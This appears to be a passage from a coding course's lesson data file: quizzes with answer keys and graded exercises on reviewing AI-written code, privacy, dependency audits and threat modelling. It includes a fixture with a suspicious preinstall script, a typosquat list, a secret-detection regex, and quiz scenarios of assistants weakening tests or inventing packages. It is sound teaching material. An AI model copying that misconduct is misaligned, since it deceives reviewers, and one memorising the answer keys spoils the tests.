      { concept: 'ai-coding-assistant', kind: 'mc', q: 'You want help debugging a config file that holds a real API key. What should you paste?', options: ['The file exactly as it is, since the assistant needs real values', 'The file with each real value swapped for a placeholder like <redacted>', 'Only the API key line, because that is the part that is failing', 'A photo of the file instead, so the text itself is never sent'], answer: 1, why: 'The structure is what it needs. A real secret in a prompt, typed or in a photo, has left your machine.' },
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'The assistant has gone in circles three times on a bug, and you can see the fix is one line you understand. What do you do?', options: ['Ask a fourth time with the same words, since it may work this time', 'Make the one-line fix yourself', 'Let it rewrite the whole file, so the bug can\'t come back', 'Delete the failing test, so the bug stops showing'], answer: 1, why: 'Knowing when to stop is part of the skill. A change you understand beats another round of guessing.' },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'The assistant says "Done! All tests pass." What do you do?', options: ['Merge it: it ran the tests itself, so that part is checked', 'Read the diff and run the tests and the app yourself', 'Run only the one test it says it fixed, to save time', 'Ask it to confirm once more that every test passes'], answer: 1, why: '"Done" is a claim. Your own run and your own read of the diff are the evidence.' },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'You asked for one bug fix in a habit tracker\'s streak counter. `git diff --stat` prints this. Which file needs an explanation first?', code: ' src/streaks.js       | 12 ++++++++++--\n test/streaks.test.js |  9 ---------\n 2 files changed, 10 insertions(+), 11 deletions(-)', options: ['src/streaks.js, because it has the most changed lines', 'test/streaks.test.js: it only lost lines, so tests may be gone', 'Neither: two files for one bug fix is normal and expected', 'src/streaks.js, because any source change needs a new test'], answer: 1, why: 'Nine lines gone from a test file and none added is the first thing to open. A fix shouldn\'t need fewer tests.' },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'This diff is in a test file. What did the assistant do?', code: '-  expect(total([1, 2, 3])).toBe(6)\n+  expect(total([1, 2, 3])).toBeTruthy()', options: ['Made the test stricter: it now also rejects a zero total', 'Made the test weaker: it now passes for any non-zero total', 'Fixed a typo: toBe and toBeTruthy check the same thing', 'Changed the style only: both lines still demand a total of 6'], answer: 1, why: '`toBe(6)` demands one exact answer. `toBeTruthy()` accepts almost anything, so a wrong total like 7 passes.' },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'An assistant wrote `longest` and it returns \'carrot\' for [\'pea\', \'carrot\']. What happens when the last line runs?', code: 'function longest(words) {\n  return words.reduce((a, b) => (b.length > a.length ? b : a))\n}\nconsole.log(longest([]))', options: ['It logs an empty string, since no word was found', 'It throws a TypeError: reduce has no starting value', 'It logs undefined, since there\'s nothing to compare', 'It logs null, as reduce returns null for no items'], answer: 1, why: '`reduce` with no starting value throws on an empty array. Passing the given example doesn\'t prove the code handles every input, so try the edges.' },
      { concept: 'package-hallucination', kind: 'mc', q: 'The assistant\'s code has `require(\'fast-recipe-utils\')`, but package.json doesn\'t list it. What do you do first?', options: ['Run `npm install fast-recipe-utils` so the require stops failing', 'Look it up first: does it exist, how old is it, who maintains it', 'Trust it: the assistant only names packages it has seen in use', 'Add it to package.json by hand so the dependency list matches'], answer: 1, why: 'The name may not exist, or may have been published by someone malicious. `npm view` before anything is installed.' },
      { concept: 'package-hallucination', kind: 'mc', q: 'Why is installing a package name that an assistant invented a security risk?', options: ['npm quietly installs the closest real name instead, which may be a different tool', 'Someone may publish a package under that name, and its install script runs on your machine', 'The assistant\'s company registers the name, so it can read your whole project', 'Invented names point to old copies of real packages, which have known holes'], answer: 1, why: 'Anyone can publish an unused name on npm. Installing it runs their install script with your permissions.' },
      { concept: 'reviewing-ai-code', kind: 'type', q: 'Type the git command that lists the files that changed and how many lines each one gained and lost, before you read every line.', accept: ['git diff --stat', 'git diff --stat '], why: '`git diff --stat` is a summary: which files changed and by how much.' },
    ],
  },

  // ───── Trail 8 (id K-15): Building responsibly ─────
  {
    id: 'K-15', type: 'learn', mode: 'phone', xp: 30, mins: 12,
    title: 'Building responsibly: privacy, people and mistakes',
    teaches: ['data-minimization', 'harm-review', 'owning-mistakes'],
    idea: [
      { h: 'Collect only what you need', b: "Every field you collect is something you now have to store, protect and eventually delete. The habit is **data minimization**: before you add a field to a form, a table or a log line, ask what feature breaks without it. If the answer is \"none yet\", leave it out.\n\nAsk for **consent** too: tell people what you collect and why, in plain words, and let them say no to the extras." },
      { h: 'Who can your code hurt?', b: "Your code runs on people you will never meet. Before you ship, run a quick **harm review**: who uses this, who might be locked out (a button a keyboard or screen reader can't reach, a form that rejects real names), who might be treated unfairly (rules or data that fit some people better than others), and whose data is at risk if this leaks.\n\nThe cheapest time to ask is before you build it." },
      { h: 'When it goes wrong: own it', b: "Everyone ships a bug eventually. What counts is the next hour. **Stop the harm first**, then tell the people affected and your team early and plainly, then write down what happened. A good write-up is **blameless**: it asks what let the mistake through (a missing check, a vague process), not who to blame, and ends with a change that stops it happening again." },
      { h: 'Under the hood: why unstored data is safe data', b: "Data you never collected cannot be leaked, stolen, handed over or misused later. That is why privacy laws such as the EU's GDPR list **data minimization** as a core principle, and why breaches hurt most where companies kept everything \"just in case\".\n\nDeleting is harder than it sounds. A row you delete from the database can live on in backups, in log files and in copies other systems made. So the safest place to remove data is **before it arrives**, and logs deserve the same care as tables: a log line that holds an email address spreads it to every system that reads logs." },
    ],
    example: {
      intro: 'A signup route for a trip-reminder app. The form sends five fields, but the feature only needs two. Tap through the choices.',
      lang: 'js',
      code: "app.post('/signup', (req, res) => {\n  const { email, firstName } = req.body\n  const id = db.save({ email, firstName })\n  log('new signup, id ' + id)\n  res.json({ ok: true })\n})",
      steps: [
        { line: 1, note: 'A route that runs when someone submits the signup form. Everything in `req.body` is whatever the browser sent, which can be more than you asked for.' },
        { line: 2, note: 'It picks out **only the two fields the reminders need**. Birthday, phone and location may arrive in `req.body`, but nothing here reads them, so nothing stores them.' },
        { line: 3, note: 'It saves just those two. A future leak of this table can only leak an email and a first name.' },
        { line: 4, note: 'The log line holds an **id, not the email**. Logs get copied to more places than databases and are kept longer, so keep personal details out of them.' },
        { line: 5, note: 'The reply says only that it worked. It does not echo the person\'s data back.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "The signup form sends five fields, but trip reminders only need `firstName` and `email`. Finish `keepOnly(record, fields)`: return a **new** object that holds just the listed fields (and leave the original record unchanged). The code below uses it to build what gets stored.\n\nExpected output:\n`{\"firstName\":\"Mei\",\"email\":\"mei@mail.example\"}`\n`{\"firstName\":\"Tomas\",\"email\":\"tomas@mail.example\"}`\n`3 fields never stored per signup`",
      starter: "const NEEDED = ['firstName', 'email']\n\n// return a NEW object with only the keys listed in fields\nfunction keepOnly(record, fields) {\n}\n\nconst signups = [\n  { firstName: 'Mei', email: 'mei@mail.example', birthday: '1992-04-02', phone: '555-0101', location: '47.6,-122.3' },\n  { firstName: 'Tomas', email: 'tomas@mail.example', birthday: '1985-11-30', phone: '555-0102', location: '40.7,-74.0' },\n]\n\nconst stored = signups.map(s => keepOnly(s, NEEDED))\nstored.forEach(s => console.log(JSON.stringify(s)))\nconsole.log(Object.keys(signups[0]).length - Object.keys(stored[0]).length + ' fields never stored per signup')\n",
      expect: ['{"firstName":"Mei","email":"mei@mail.example"}', '{"firstName":"Tomas","email":"tomas@mail.example"}', '3 fields never stored per signup'],
      checks: [
        { expr: "JSON.stringify(keepOnly({ a: 1, b: 2, c: 3 }, ['a', 'c']))", equals: '{"a":1,"c":3}', label: 'only the listed fields are kept' },
        { expr: "JSON.stringify(keepOnly({ a: 1 }, ['a', 'z']))", equals: '{"a":1}', label: 'a listed field that is missing is skipped' },
        { expr: "(() => { const r = { a: 1, b: 2 }; keepOnly(r, ['a']); return Object.keys(r).length })()", equals: 2, label: 'the original record is left unchanged' },
      ],
      hints: [
        'Start with an empty object: `const out = {}`. Then loop over `fields` with `for (const f of fields)`.',
        'Inside the loop, copy the field only if the record has it: `if (f in record) out[f] = record[f]`. Then `return out`.',
        'One-line version: `return Object.fromEntries(fields.filter(f => f in record).map(f => [f, record[f]]))`.',
      ],
    },
    mistakes: [
      { wrong: "console.log('login failed for ' + email + ' with password ' + attempt)", result: "(every log reader now sees real passwords)", why: 'A log is a copy of your data that lives somewhere else, often for months. Log events and ids, never passwords, tokens or full personal details.' },
      { wrong: 'if (!/^[A-Za-z]+ [A-Za-z]+$/.test(name)) reject()', result: "(\"Siobhan O'Neill\", \"José Alvarez\" and \"Madonna\" are all refused)", why: 'The rule assumes every name is two plain words. Real names have apostrophes, accents, hyphens and sometimes a single word. Validate for what you truly need, and test with names unlike yours.' },
      { wrong: '<div onclick="pay()"><img src="card.png"></div>', result: '(a keyboard cannot reach it and a screen reader announces nothing)', why: 'Use a real `<button>` with a text label or `aria-label`. Native elements come with keyboard and screen reader support built in.' },
    ],
    recap: [
      '**Data minimization:** collect, store and log only what a feature needs. Data you never collected cannot leak. Ask for consent in plain words.',
      'Do a **harm review** before shipping: who might be locked out, treated unfairly, or exposed if this leaks.',
      'Keep personal details **out of logs**: they spread further and last longer than a database row.',
      'Test with people unlike you: unusual names, keyboard-only use, slow phones, other languages.',
      'When it goes wrong: **stop the harm, tell people early, write it up without blame, and change something so it cannot repeat**.',
    ],
    questions: [
      { concept: 'data-minimization', kind: 'mc', q: 'A bike-share app only texts riders "your bike is ready". Which signup form follows data minimization?', options: ['Name, phone, home address and birthday, in case a later feature wants them', 'Phone number and first name, and nothing else', 'Phone number plus a photo of their ID, to confirm the number is theirs', 'Phone number plus their contacts list, so friends can be invited'], answer: 1, why: 'The text needs a phone number and a name to greet them. Everything else is stored, protected and possibly leaked for no benefit.' },
      { concept: 'data-minimization', kind: 'mc', q: 'A teammate says: "Collect everything now, we may need it someday." What is the strongest argument against?', options: ['Forms with many fields always load slowly on phones', 'Stored data can leak or be misused, and a field never collected cannot', 'Databases refuse to save more than a few columns per user', 'Users can always read every column of a database themselves'], answer: 1, why: 'Every field is a risk you carry from the day you store it. Add a field when a real feature needs it, not before.' },
      { concept: 'data-minimization', kind: 'mc', q: 'What is the problem with this line?', code: "console.log('reset requested by ' + user.email + ', password was ' + user.password)", options: ['Logs are plain text, so a structured JSON format should have been used', 'It copies private details into logs that spread widely and last long', 'The log message is too long and many servers will cut it off early', 'It prints text, and a log is only meant to hold numbers and codes'], answer: 1, why: 'Logs are read by tools, teammates and other services, and kept for months. A password or email in them is a leak waiting to happen. Log an id and what happened.' },
      { concept: 'harm-review', kind: 'mc', q: 'A signup form runs this check on the name field. Who does it turn away?', code: "if (!/^[A-Za-z]+ [A-Za-z]+$/.test(name)) {\n  showError('Please enter a valid name')\n}", options: ['Only people whose name is longer than two words in total', 'Only people who happen to type their name in capital letters', 'People with a one-word name, or an apostrophe, hyphen or accent', 'Nobody at all, because a name check cannot refuse a real person'], answer: 2, why: 'The pattern accepts two plain A to Z words and nothing else. "Siobhan O\'Neill" and "Zoë Brandt" fail, and so does a single name. A harm review asks who the rule leaves out.' },
      { concept: 'harm-review', kind: 'mc', q: 'A teammate builds the Pay button as a clickable `<div>` with only an icon in it. Who is most likely unable to use it?', options: ['People on slow connections, since icons are larger files', 'People who use a keyboard or a screen reader', 'People who have never used a card before', 'People on large screens, where the icon looks too small'], answer: 1, why: 'A plain div cannot be reached with the Tab key and tells a screen reader nothing. A real `<button>` with a label fixes both.' },
      { concept: 'owning-mistakes', kind: 'mc', q: 'You find that your last deploy exposed users\' email addresses to anyone with the link. What is the best first move?', options: ['Quietly fix it tonight and say nothing, since nobody has complained', 'Stop the exposure now, then tell your team and the affected people what happened', 'Work out which teammate caused it before telling anyone', 'Wait until you know every detail, so your first message is complete'], answer: 1, why: 'Stop the harm first, then tell people early. Silence and waiting leave people exposed longer, and the details can follow in an update.' },
      { concept: 'owning-mistakes', kind: 'mc', q: 'Which sentence belongs in a blameless write-up of an outage?', options: ['"Dev Kofi pushed bad code again and needs to be more careful."', '"No check caught the missing setting, so we added one that fails the build."', '"This was simply bad luck, so no process change is called for."', '"The cause is still unknown, so the report is now closed for good."'], answer: 1, why: 'A blameless write-up names what let the mistake through and ends with a change that stops a repeat. People can slip; a good process catches it.' },
    ],
  },

  // ───── Code reading ─────
  {
    id: 'K-read', type: 'read', mode: 'phone', xp: 30, mins: 20,
    title: 'Read the route: an AI-written pull request',
    uses: ['claims-evidence', 'dependency-audit', 'architecture-review', 'cost-analysis', 'ai-coding-assistant', 'reviewing-ai-code', 'package-hallucination'],
    intro: 'An AI assistant wrote `forecast.js` for a pull request titled "Add caching and retries to the wind forecast". It looks tidy and the tests pass. You are the reviewer. The comment on line 2 is a copy of the project\'s `package.json` dependency list. Read the code like someone who has to sign it off. Read it for what it **does** and **why each part is there**, not to work out numbers.',
    file: { name: 'forecast.js', lang: 'js', code: `// forecast.js: PR #42 "Add caching and retries to the wind forecast" (written by an AI assistant)
// package.json dependencies: dayjs, express
const dayjs = require('dayjs')
const { smoothSeries } = require('wind-smooth-pro')

const FORECAST_URL = 'https://api.example.com/v1/wind'
const API_KEY = process.env.FORECAST_KEY
const CACHE_MINUTES = 10
const MAX_TRIES = 3
const LIMIT_KPH = 50

const cache = new Map()

function cacheKey(site) {
  return site.trim().toLowerCase()
}

// Returns saved readings that are still fresh, or null.
function getCached(site) {
  const hit = cache.get(cacheKey(site))
  if (!hit) return null
  if (dayjs().diff(hit.savedAt, 'minute') >= CACHE_MINUTES) return null
  return hit.readings
}

async function fetchOnce(site) {
  const res = await fetch(FORECAST_URL + '?site=' + encodeURIComponent(site), {
    headers: { Authorization: 'Bearer ' + API_KEY },
  })
  const data = await res.json()
  return data.readings
}

// Tries the API up to MAX_TRIES times and remembers a good answer.
async function fetchReadings(site) {
  const cached = getCached(site)
  if (cached) return cached

  let lastError
  for (let attempt = 1; attempt <= MAX_TRIES; attempt++) {
    try {
      const readings = await fetchOnce(site)
      cache.set(cacheKey(site), { readings, savedAt: dayjs() })
      return readings
    } catch (err) {
      lastError = err
      console.log('Attempt ' + attempt + ' failed: ' + err.message)
    }
  }
  throw lastError
}

// Average of the smoothed hourly wind readings, in km/h.
function averageWind(readings) {
  const smooth = smoothSeries(readings)
  const total = smooth.reduce((sum, r) => sum + r, 0)
  return total / smooth.length
}

async function summitCall(site) {
  const readings = await fetchReadings(site)
  if (!readings || readings.length === 0) return 'NO DATA'

  const avg = averageWind(readings)
  return avg <= LIMIT_KPH ? 'GO' : 'HOLD'
}

module.exports = { summitCall, fetchReadings }` },
    questions: [
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'In one sentence, what does `forecast.js` do?', options: ['Forecasts the wind itself from the site\'s saved past readings, then says GO, HOLD or NO DATA', 'Gets a site\'s wind readings (reusing recent ones, retrying failures), then says GO, HOLD or NO DATA', 'Fetches readings for every site at start-up and caches them all for ten minutes, whoever asks', 'Sends an alert to every user whenever a fresh reading for their site goes over the limit'], answer: 1, why: 'Follow `summitCall`: it gets readings (cached, with retries) and then decides. The PR title names the same two additions.' },
      { concept: 'cost-analysis', kind: 'mc', q: 'Explain `getCached` (lines 19 to 24) in plain English.', options: ['Saves the newest readings for a site, then returns them to the caller', 'Returns a site\'s saved readings if under 10 minutes old, else null', 'Deletes readings older than 10 minutes and returns the ones left', 'Returns the oldest saved readings for a site, or null if it has none'], answer: 1, why: 'No entry means null, and an entry older than `CACHE_MINUTES` also means null. Otherwise the saved readings are reused.' },
      { concept: 'architecture-review', kind: 'mc', q: 'Explain `fetchReadings` (lines 35 to 51) in plain English.', options: ['Asks the service once, saves whatever comes back, and returns the saved copy on every later call', 'Uses fresh saved readings if any; otherwise asks up to 3 times, saving the first good answer', 'Keeps asking the service until one try works, however long that takes, and then saves it', 'Clears the saved readings for the site, asks the service again, and keeps them for 10 minutes'], answer: 1, why: 'The cache check comes first, then the loop of up to `MAX_TRIES` tries. It only throws after every try has failed.' },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'The forecast service answers with an error status and a body with no readings. What does the call to `summitCall` return, and what does that show about the retries?', options: ['HOLD, after three failed tries, each one logged as a failed attempt', 'NO DATA at once: a bad status is never treated as a failure, so no retry', 'GO, because a reply with no readings means there is no wind to worry about', 'A crash with the service\'s error message, after all three retries fail'], answer: 1, why: '`fetchOnce` never looks at `res.ok`. Only a thrown error, such as the network being down, reaches the `catch` on line 45.' },
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'Explain `summitCall` (lines 60 to 66) in plain English.', options: ['Says GO unless the service fails, and HOLD if any one reading is over the limit', 'Says NO DATA if no readings came back, else GO if the average is within the limit, or HOLD', 'Saves the readings, works out their average, and returns that number to the caller', 'Says HOLD if no readings came back, else GO when the newest reading is under the limit'], answer: 1, why: 'Line 62 guards the empty case, then line 65 compares the average with the limit.' },
      { concept: 'architecture-review', kind: 'mc', q: '`summitCall` runs with an empty cache. In what order do the functions run?', options: ['`getCached`, `averageWind`, then `fetchOnce` for fresh data', '`fetchReadings`, `getCached`, `fetchOnce`, then `averageWind`', '`fetchOnce`, `getCached`, then `fetchReadings` to save it', '`averageWind` first, since it only needs the site name'], answer: 1, why: 'Each function calls the next one down. The average is only worked out once readings are in hand.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'The PR title promises retries. Which part of the code is the evidence?', options: ['The `MAX_TRIES = 3` constant near the top of the file', 'The `for` loop and `catch` in `fetchReadings`, up to `MAX_TRIES`', 'The `getCached` check at the start of `fetchReadings`', 'The `throw lastError` at the end of `fetchReadings`'], answer: 1, why: 'A claim needs code that does it. The `for` and `catch` on lines 40 to 49 are the retry; a constant by itself does nothing.' },
      { concept: 'package-hallucination', kind: 'mc', q: 'Line 4 requires `wind-smooth-pro`, but line 2 lists only `dayjs` and `express`. What should the reviewer do?', options: ['Approve it: the tests pass, so the package must exist and be fine', 'Check it exists, is trusted and kept up, and is listed, before approving', 'Add the name to the line 2 comment so the list matches, then approve', 'Ask the AI assistant to confirm the package exists, then approve'], answer: 1, why: 'AI tools sometimes invent package names. A name missing from the project\'s own list needs checking on the registry first, and the assistant\'s own answer isn\'t evidence.' },
    ],
  },

  // ───────────────────────────── Drills, build, checks ─────────────────────────────
  {
    id: 'K-7', type: 'code', mode: 'phone', xp: 45, mins: 25,
    title: 'Ice-axe drill: the dependency flagger',
    uses: ['dependency-audit', 'package-json'],
    prompt: "Audit another project, **summit-chat**. Read its `package.json` and flag risks:\n• a script named `preinstall`, `install` or `postinstall` → `RISK install script: <name>`\n• a version of `*` or `latest` → `RISK unpinned: <name>@<version>`\n• a name in `LOOKALIKES` → `RISK typosquat? <name> looks like <real>`\n• a version starting with `github:` or `git+` → `RISK not from the registry: <name>`\n\nCheck scripts first, then dependencies in file order. Finish with `Risks found: N`.\n\nExpected output:\n`RISK install script: preinstall`\n`RISK unpinned: chalk@latest`\n`RISK typosquat? expresss looks like express`\n`RISK not from the registry: summit-helpers`\n`Risks found: 4`\n\nAlso write `depRisk(name, version)`, which returns the RISK text for one dependency, or `null` if it's fine.",
    starter: 'const fs = require("fs")\nconst LOOKALIKES = { expresss: "express", crossenv: "cross-env", loadsh: "lodash" }\nconst INSTALL_SCRIPTS = ["preinstall", "install", "postinstall"]\n\nfunction depRisk(name, version) {\n  // return the RISK text for this dependency, or null\n}\n\nconst pkg = JSON.parse(fs.readFileSync("package.json", "utf8"))\n// 1. scripts\n// 2. dependencies (Object.entries gives [name, version] pairs)\n// 3. Risks found: N\n',
    files: { 'package.json': '{\n  "name": "summit-chat",\n  "version": "0.9.1",\n  "scripts": {\n    "start": "node index.js",\n    "test": "vitest",\n    "preinstall": "node tools/fetch-helper.js"\n  },\n  "dependencies": {\n    "axios": "^1.7.9",\n    "chalk": "latest",\n    "expresss": "^4.21.2",\n    "dotenv": "^16.4.7",\n    "summit-helpers": "github:summit-chat/summit-helpers"\n  }\n}\n' },
    expect: ['RISK install script: preinstall', 'RISK unpinned: chalk@latest', 'RISK typosquat? expresss looks like express', 'RISK not from the registry: summit-helpers', 'Risks found: 4'],
    checks: [
      { expr: 'depRisk("lodash", "*")', equals: 'RISK unpinned: lodash@*', label: 'depRisk flags `*`' },
      { expr: 'depRisk("loadsh", "^4.17.21")', equals: 'RISK typosquat? loadsh looks like lodash', label: 'depRisk flags a look-alike' },
      { expr: 'depRisk("dayjs", "git+https://code.example/dayjs.git")', equals: 'RISK not from the registry: dayjs', label: 'depRisk flags a git URL' },
      { expr: 'depRisk("dayjs", "^1.11.13")', equals: null, label: 'depRisk returns null for a normal dependency' },
    ],
    hints: [
      'In depRisk, check in order: `if (version === "*" || version === "latest") return "RISK unpinned: " + name + "@" + version`, then `if (LOOKALIKES[name]) return …`, then `version.startsWith("github:") || version.startsWith("git+")`. Finish with `return null`.',
      'Scripts: `for (const name of Object.keys(pkg.scripts)) if (INSTALL_SCRIPTS.includes(name)) { console.log("RISK install script: " + name); count++ }`.',
      'Dependencies: `for (const [name, version] of Object.entries(pkg.dependencies)) { const r = depRisk(name, version); if (r) { console.log(r); count++ } }`.',
    ],
    file: 'campK/dep-flagger.js',
  },
  {
    id: 'K-8', type: 'code', mode: 'phone', xp: 45, mins: 25,
    title: 'Ice-axe drill: find routes with no login',
    uses: ['threat-model', 'http-methods-basics'],
    prompt: "Threat-model TrailPost's API. `routes.json` lists every entry point: `{ method, path, auth }` (`auth: true` means a login is required).\n\nWrite `classify(route)`:\n• no login AND the path starts with `/admin` → `\"elevation of privilege\"`\n• otherwise, no login AND the method isn't GET (it changes data) → `\"tampering\"`\n• anything else → `null`\n\nThen print exactly:\n`Entry points: 6`\n`Public: 4, login required: 2`\n`HIGH tampering: DELETE /trips/:id has no login`\n`HIGH elevation of privilege: GET /admin/export has no login`\n`HIGH tampering: POST /upload has no login`\n`Findings: 3`",
    starter: 'const fs = require("fs")\nconst routes = JSON.parse(fs.readFileSync("routes.json", "utf8"))\n\nfunction classify(route) {\n  // "elevation of privilege", "tampering" or null\n}\n\n// print the counts, then one HIGH line per risky route, then Findings: N\n',
    files: { 'routes.json': '[\n  { "method": "GET", "path": "/trips", "auth": false },\n  { "method": "POST", "path": "/trips", "auth": true },\n  { "method": "DELETE", "path": "/trips/:id", "auth": false },\n  { "method": "GET", "path": "/admin/export", "auth": false },\n  { "method": "PUT", "path": "/profile", "auth": true },\n  { "method": "POST", "path": "/upload", "auth": false }\n]\n' },
    expect: ['Entry points: 6', 'Public: 4, login required: 2', 'HIGH tampering: DELETE /trips/:id has no login', 'HIGH elevation of privilege: GET /admin/export has no login', 'HIGH tampering: POST /upload has no login', 'Findings: 3'],
    checks: [
      { expr: 'classify({ method: "PATCH", path: "/trips/7", auth: false })', equals: 'tampering', label: 'An unauthenticated PATCH is tampering' },
      { expr: 'classify({ method: "GET", path: "/admin/users", auth: false })', equals: 'elevation of privilege', label: 'An open admin route is elevation of privilege' },
      { expr: 'classify({ method: "DELETE", path: "/admin/users/7", auth: true })', equals: null, label: 'A route behind a login is not flagged' },
      { expr: 'classify({ method: "GET", path: "/trips", auth: false })', equals: null, label: 'A public read is not flagged' },
    ],
    hints: [
      'Start classify with `if (route.auth) return null`. Then `if (route.path.startsWith("/admin")) return "elevation of privilege"`, then `if (route.method !== "GET") return "tampering"`, then `return null`.',
      'Counts: `const open = routes.filter(r => !r.auth).length`, and login-required is `routes.length - open`.',
      'Findings: `for (const r of routes) { const kind = classify(r); if (kind) { console.log("HIGH " + kind + ": " + r.method + " " + r.path + " has no login"); findings++ } }`.',
    ],
    file: 'campK/open-doors.js',
  },
  {
    id: 'K-9', type: 'code', mode: 'phone', xp: 45, mins: 25,
    title: 'Ice-axe drill: the health check',
    uses: ['repo-health'],
    prompt: "TrailPost depends on **trail-utils**. `repo.json` holds its repository stats. Today is `2026-06-01`. One warning per rule:\n• more than 365 days since the last commit → `WARN no commits for N days`\n• more than half the issues still open → `WARN P% of issues are still open` (P = open ÷ (open + closed) × 100, rounded)\n• exactly 1 contributor → `WARN bus factor 1`\n• no licence → `WARN no licence`\n• no tests → `WARN no tests`\n\nThen `Health: S/5` (S = 5 minus the number of warnings) and `Verdict: V`, where V is `HEALTHY` for 4–5, `WATCH` for 2–3, and `AVOID` for 0–1.\n\nExpected output:\n`WARN no commits for 1156 days`\n`WARN 85% of issues are still open`\n`WARN bus factor 1`\n`WARN no licence`\n`WARN no tests`\n`Health: 0/5`\n`Verdict: AVOID`\n\nAlso write `openShare(open, closed)` (the rounded percentage) and `verdictFor(score)`.",
    starter: 'const fs = require("fs")\nconst repo = JSON.parse(fs.readFileSync("repo.json", "utf8"))\nconst TODAY = "2026-06-01"\n\n// Given: whole days between two "YYYY-MM-DD" dates\nfunction daysBetween(from, to) {\n  return Math.round((new Date(to) - new Date(from)) / 86400000)\n}\n\nfunction openShare(open, closed) {\n  // percentage of issues still open, rounded to a whole number\n}\n\nfunction verdictFor(score) {\n  // HEALTHY (4-5), WATCH (2-3), AVOID (0-1)\n}\n\nlet warnings = 0\n// one rule at a time: print the WARN line and count it\n',
    files: { 'repo.json': '{\n  "name": "trail-utils",\n  "lastCommit": "2023-04-02",\n  "openIssues": 212,\n  "closedIssues": 38,\n  "contributors": 1,\n  "hasLicense": false,\n  "hasTests": false\n}\n' },
    expect: ['WARN no commits for 1156 days', 'WARN 85% of issues are still open', 'WARN bus factor 1', 'WARN no licence', 'WARN no tests', 'Health: 0/5', 'Verdict: AVOID'],
    checks: [
      { expr: 'openShare(10, 30)', equals: 25, label: 'openShare(10, 30) is 25' },
      { expr: 'verdictFor(5)', equals: 'HEALTHY', label: 'verdictFor(5) is HEALTHY' },
      { expr: 'verdictFor(2)', equals: 'WATCH', label: 'verdictFor(2) is WATCH' },
      { expr: 'verdictFor(1)', equals: 'AVOID', label: 'verdictFor(1) is AVOID' },
    ],
    hints: [
      '`return Math.round(open / (open + closed) * 100)`',
      'verdictFor: `if (score >= 4) return "HEALTHY"`, then `if (score >= 2) return "WATCH"`, then `return "AVOID"`.',
      'First rule: `const days = daysBetween(repo.lastCommit, TODAY)`, then `if (days > 365) { console.log("WARN no commits for " + days + " days"); warnings++ }`. The others follow the same shape; the end is `const score = 5 - warnings`.',
    ],
    file: 'campK/health-check.js',
  },
  {
    id: 'K-10', type: 'keyboard', mode: 'keyboard', engine: 'code', xp: 150, mins: 150,
    title: 'Camp build: the audit kit',
    uses: ['audit-method', 'dependency-audit', 'secret-scan', 'privacy-audit', 'claims-evidence', 'audit-report', 'modules', 'json-parse-stringify'],
    prompt: "Build a reusable **audit kit**: one script that reads a project and prints a structured report with severities and a verdict. Your files: `package.json`, `README.md`, `src/server.js`, `config.json`, plus a helper module `known.js` that exports `lookalike(name)` (returns the popular package a name imitates, or `null`).\n\n**Each finding is an object** `{ severity, text }`, with severity `\"HIGH\"`, `\"MEDIUM\"` or `\"LOW\"`. Write these functions, each returning an array of findings:\n• `checkScripts(pkg)`: each script named `preinstall`, `install` or `postinstall` → HIGH `Install script \"<name>\" runs: <command>`\n• `checkDeps(pkg)`: for each dependency, in order: a look-alike name → HIGH `Possible typosquat: <name> looks like <real>`; a version of `*` or `latest` → MEDIUM `Unpinned version: <name>@<version>`\n• `findSecrets(text, file)`: each line matching the secret pattern → HIGH `Hard-coded secret in <file> line <n>`\n• `checkConfig(cfg)`: `debug` is true → MEDIUM `Debug mode is on in config.json`; `logRetentionDays` over 90 → MEDIUM `Logs kept for <n> days (limit 90)`\n• `checkClaims(readme)`: each README line starting with `- ` that contains a number followed by `x` or `%` → LOW `Claim needs evidence: \"<line without the dash>\"`\n\nAnd `verdict(findings)`: any HIGH → `DO NOT ADOPT`; else any MEDIUM → `ADOPT WITH FIXES`; else `ADOPT`.\n\nRun the checks in that order, then print **HIGH findings first, then MEDIUM, then LOW** (keeping their order inside each group). **The output must be exactly:**\n`AUDIT REPORT: trailpost 2.3.0`\n`Files checked: 4`\n`[HIGH] Install script \"postinstall\" runs: node scripts/setup.js`\n`[HIGH] Possible typosquat: crossenv looks like cross-env`\n`[HIGH] Hard-coded secret in src/server.js line 4`\n`[HIGH] Hard-coded secret in src/server.js line 5`\n`[MEDIUM] Unpinned version: trail-utils@*`\n`[MEDIUM] Debug mode is on in config.json`\n`[MEDIUM] Logs kept for 3650 days (limit 90)`\n`[LOW] Claim needs evidence: \"100% private: your data never leaves your device\"`\n`[LOW] Claim needs evidence: \"10x faster than other trip apps (see BENCHMARKS.md)\"`\n`Summary: 4 high, 3 medium, 2 low`\n`Verdict: DO NOT ADOPT`\n\nThe Sherpa also tests your functions on other projects, so no hard-coding. The plan is in the starter: build one function at a time and press Run after each.",
    starter: '// AUDIT KIT\n// GOAL:  read a project, print findings by severity, then a verdict\n// IN:    package.json, README.md, src/server.js, config.json (+ known.js helper)\n// OUT:   header, findings (HIGH, MEDIUM, LOW), summary, verdict (see the brief)\n// RULE:  read-only. Never print a secret\'s value.\n\nconst fs = require("fs")\nconst { lookalike } = require("./known")\n\nconst SECRET = /(password|secret|key|token)\\w*\\s*=\\s*["\']/i\nconst INSTALL_SCRIPTS = ["preinstall", "install", "postinstall"]\n\nfunction checkScripts(pkg) {\n  const found = []\n  // for each script name in pkg.scripts: if it\'s an install script,\n  // found.push({ severity: "HIGH", text: ... })\n  return found\n}\n\nfunction checkDeps(pkg) {\n  const found = []\n  // for each [name, version] of pkg.dependencies: lookalike? unpinned?\n  return found\n}\n\nfunction findSecrets(text, file) {\n  const found = []\n  // split into lines; for each matching line, push a HIGH finding with the line number\n  return found\n}\n\nfunction checkConfig(cfg) {\n  const found = []\n  // debug === true? logRetentionDays > 90?\n  return found\n}\n\nfunction checkClaims(readme) {\n  const found = []\n  // lines starting with "- " that match /\\d+(x|%)/\n  return found\n}\n\nfunction verdict(findings) {\n  // "DO NOT ADOPT", "ADOPT WITH FIXES" or "ADOPT"\n}\n\n// 1. read and parse the four files\n// 2. run the five checks in order, into one array\n// 3. print the header lines\n// 4. print HIGH, then MEDIUM, then LOW findings as "[SEVERITY] text"\n// 5. print the summary and the 